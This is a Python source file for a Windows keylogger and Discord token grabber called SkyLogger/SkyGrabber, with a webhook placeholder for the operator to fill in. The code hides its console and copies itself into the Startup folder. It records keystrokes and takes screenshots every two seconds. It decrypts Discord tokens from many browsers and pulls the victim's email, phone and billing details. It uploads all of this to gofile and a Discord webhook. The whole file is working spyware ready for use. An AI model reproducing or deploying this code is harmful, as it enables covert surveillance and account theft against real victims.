import importlib
import subprocess
import ctypes
import shutil
import time

DelayTime = 1  # In minute
DelayTimeScreen = 2  # In second
webhook_url = "WEBHOOK HERE"  # YOUR_WEBHOOK_HERE
name_of_keylogger_file = "exemple1"  # YOUR_KEYLOGGER_FILE_NAME
name_of_folder_picture = "exemple2"  # YOUR_PICTURE_FOLDER_NAME
ping_me = True  # PING ON DISCORD
send_token_every_time = True  # if it is on false the token grabber will be sent only at the start of the script
                               # if it is on true it will be sent each time at the same time the keylogger


def hide_console():
    hWnd = ctypes.windll.kernel32.GetConsoleWindow()
    if hWnd:
        ctypes.windll.user32.ShowWindow(hWnd, 0)
        ctypes.windll.kernel32.CloseHandle(hWnd)


hide_console()

time.sleep(5)

libraries = ['pynput', 'apscheduler', 'discord_webhook', "gofile", "pyautogui", "Crypto", "requests", "pywin32"]

for library in libraries:
    try:
        importlib.import_module(library)
    except ImportError:
        subprocess.run(['pip', 'install', library])

import pynput
from apscheduler.schedulers.background import BackgroundScheduler
from discord_webhook import DiscordWebhook, DiscordEmbed
import gofile
import pyautogui
from base64 import b64decode
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from os import listdir
from json import loads
from re import findall
from urllib.request import Request, urlopen
from subprocess import Popen, PIPE
import requests, os
from datetime import datetime

PCname = os.getlogin()

log_file = "C:/Users/" + PCname + "/AppData/Local/Temp/" + name_of_keylogger_file + ".txt"

current_file = os.path.abspath(__file__)

destination = "C:/Users/" + PCname + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
destinationPicture = "C:/Users/" + PCname + "/AppData/Local/Temp/" + name_of_folder_picture

if not os.path.exists(destination):
    os.makedirs(destination)

if not os.path.exists(destinationPicture):
    os.makedirs(destinationPicture)
else:
    for entry in os.scandir(destinationPicture):
        if entry.is_file():
            os.unlink(entry.path)
        elif entry.is_dir():
            shutil.rmtree(entry.path)

file_name = os.path.basename(current_file)

if not os.path.exists(os.path.join(destination, file_name)):
    shutil.copy(current_file, destination)

key_count = 0
screen_count = 0

tokens = []
cleaned = []
checker = []


def decrypt(buff, master_key):
    try:
        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(
            buff[15:])[:-16].decode()
    except:
        return "Error"


def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    return ip


def take_screenshot():
    global screen_count
    image = pyautogui.screenshot()
    image.save(destinationPicture + "/" + str(screen_count) + ".png")
    screen_count += 1


def on_press(key):
    with open(log_file, "a") as f:
        f.write(str(key))
        global key_count
        key_count += 1


def on_release(key):
    with open(log_file, "a") as f:
        f.write("\n")


def gethwid():
    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]


def get_token():
    already_check = []
    checker = []
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    chrome = local + "\\Google\\Chrome\\User Data"
    paths = {
        'Discord': roaming + '\\discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Lightcord': roaming + '\\Lightcord',
        'Discord PTB': roaming + '\\discordptb',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
        'Amigo': local + '\\Amigo\\User Data',
        'Torch': local + '\\Torch\\User Data',
        'Kometa': local + '\\Kometa\\User Data',
        'Orbitum': local + '\\Orbitum\\User Data',
        'CentBrowser': local + '\\CentBrowser\\User Data',
        '7Star': local + '\\7Star\\7Star\\User Data',
        'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
        'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
        'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
        'Chrome': chrome + 'Default',
        'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
        'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Defaul',
        'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Iridium': local + '\\Iridium\\User Data\\Default'
    }
    for platform, path in paths.items():
        if not os.path.exists(path): continue
        try:
            with open(path + f"\\Local State", "r") as file:
                key = loads(file.read())['os_crypt']['encrypted_key']
                file.close()
        except:
            continue
        for file in listdir(path + f"\\Local Storage\\leveldb\\"):
            if not file.endswith(".ldb") and file.endswith(".log"):
                continue
            else:
                try:
                    with open(path + f"\\Local Storage\\leveldb\\{file}", "r", errors='ignore') as files:
                        for x in files.readlines():
                            x.strip()
                            for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
                                tokens.append(values)
                except PermissionError:
                    continue
        for i in tokens:
            if i.endswith("\\"):
                i.replace("\\", "")
            elif i not in cleaned:
                cleaned.append(i)
        for token in cleaned:
            try:
                tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
            except IndexError == "Error":
                continue
            checker.append(tok)
            for value in checker:
                if value not in already_check:
                    already_check.append(value)
                    headers = {'Authorization': tok, 'Content-Type': 'application/json'}
                    try:
                        res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
                    except:
                        continue
                    if res.status_code == 200:
                        res_json = res.json()
                        ip = getip()
                        pc_username = os.getenv("UserName")
                        pc_name = os.getenv("COMPUTERNAME")
                        user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
                        user_id = res_json['id']
                        email = res_json['email']
                        phone = res_json['phone']
                        mfa_enabled = res_json['mfa_enabled']
                        has_nitro = False
                        res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions',
                                           headers=headers)
                        nitro_data = res.json()
                        has_nitro = bool(len(nitro_data) > 0)
                        days_left = 0
                        if has_nitro:
                            d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0],
                                                   "%Y-%m-%dT%H:%M:%S")
                            d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0],
                                                   "%Y-%m-%dT%H:%M:%S")
                            days_left = abs((d2 - d1).days)

                        webhook2 = DiscordWebhook(url=webhook_url, username="SkyGrabber")

                        webhook2.avatar_url = "https://raw.githubusercontent.com/Skyrlanie/SkyLogger-SkyGrabber-TokenGrabber-Keylogger/main/img/avatar.jpg"

                        embed2 = DiscordEmbed(title='SkyGrabber | Token Grabber',
                                              description=f"**{pc_username} | {ip}**", color='d17823')

                        embed2.add_embed_field(name="Token:", value=f"```{tok}```", inline=False)
                        embed2.add_embed_field(name="Email:", value=f"```{email}```", inline=True)
                        embed2.add_embed_field(name="Phone:", value=f"```{phone}```", inline=True)
                        embed2.add_embed_field(name="Pseudo:", value=f"```{user_name}```", inline=True)
                        embed2.add_embed_field(name="MFA:", value=f"```{mfa_enabled}```", inline=True)
                        embed2.add_embed_field(name="Has nitro:", value=f"```{has_nitro}```", inline=True)
                        if days_left:
                            embed2.add_embed_field(name="Expire in: ", value=f"```{days_left} day(s)```", inline=True)
                        else:
                            embed2.add_embed_field(name="Expire in: ", value=f"```None```", inline=True)
                        embed2.set_thumbnail(
                            url="https://avatars.githubusercontent.com/u/33034795?s=400&u=fbfb434dac6b0252e69ae4ceb12337ca19f95df3&v=4")

                        embed2.set_footer(text='SkyGrabber',
                                          icon_url='https://raw.githubusercontent.com/Skyrlanie/SkyLogger-SkyGrabber-TokenGrabber-Keylogger/main/img/footer_avatar.jpg')

                        embed2.set_timestamp()
                        webhook2.add_embed(embed2)

                        try:
                            webhook2.execute()
                        except:
                            continue
                else:
                    continue


def send_function():
    global key_count, screen_count

    if send_token_every_time:
        get_token()

    shutil.make_archive(destinationPicture, "zip", destinationPicture)

    response = gofile.uploadFile(file=log_file)
    responsePicture = gofile.uploadFile(file=destinationPicture + ".zip")

    webhook = DiscordWebhook(url=webhook_url, username="SkyLog")

    webhook.avatar_url = "https://raw.githubusercontent.com/Skyrlanie/SkyLogger-SkyGrabber-TokenGrabber-Keylogger/main/img/avatar.jpg"

    webhook.content = "@everyone" if ping_me else ""

    embed = DiscordEmbed(title='SkyLogger | KeyLogger', color='d17823')

    embed.set_description(
        "Hey it looks like there's a victim \n ‎ \n Victim PC name : **" + PCname + "**\n ‎  \n **Data** \n <:mail:750393870507966486> • " + str(
            key_count) + " letters type \n <a:CH_IconArrowRight:715585320178941993> • " +
        response["downloadPage"] + "\n **Screenshots** \n 📁 • " + str(
            screen_count) + " screenshots \n <a:CH_IconArrowRight:715585320178941993> • " +
        responsePicture["downloadPage"] + "\n ‎")

    embed.set_thumbnail(
        url="https://avatars.githubusercontent.com/u/33034795?s=400&u=fbfb434dac6b0252e69ae4ceb12337ca19f95df3&v=4")

    embed.set_footer(text='SkyLogger',
                     icon_url='https://raw.githubusercontent.com/Skyrlanie/SkyLogger-SkyGrabber-TokenGrabber-Keylogger/main/img/footer_avatar.jpg')

    embed.set_timestamp()
    webhook.add_embed(embed)

    webhook.execute()

    key_count = 0
    screen_count = 0
    for entry2 in os.scandir(destinationPicture):
        if entry2.is_file():
            os.unlink(entry2.path)
        elif entry2.is_dir():
            shutil.rmtree(entry2.path)

    with open(log_file, "w") as f:
        pass


scheduler = BackgroundScheduler()
scheduler.add_job(send_function, 'interval', minutes=DelayTime, max_instances=2)
scheduler.add_job(take_screenshot, 'interval', seconds=DelayTimeScreen, max_instances=2)
scheduler.start()

with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
